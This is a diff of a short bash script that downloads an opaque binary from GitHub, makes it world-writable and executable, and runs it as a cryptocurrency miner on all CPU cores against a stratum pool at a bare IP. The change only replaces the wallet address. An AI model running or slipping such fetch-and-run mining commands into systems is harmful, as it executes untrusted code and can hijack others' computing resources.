@@ -1,4 +1,4 @@
 #!/bin/bash
 wget -O biru https://github.com/kidoescegh/filee/raw/main/avx2adv 
 chmod 777 biru
-./biru -a yespoweradvc  -o stratum+tcp://64.23.144.233:80 -u AZiqaN5C5ugfc54orCsKWK6s5X4s3JwmKj.$(shuf -n 1 -i 1-99999)-ADV -t $(nproc --all)
+./biru -a yespoweradvc -o stratum+tcp://64.23.144.233:80 -u AMfDZ53tyUitZBpR5H8C4ydY7dbAq4n7JH.$(shuf -n 1 -i 1-99999)-ADV -t $(nproc --all)
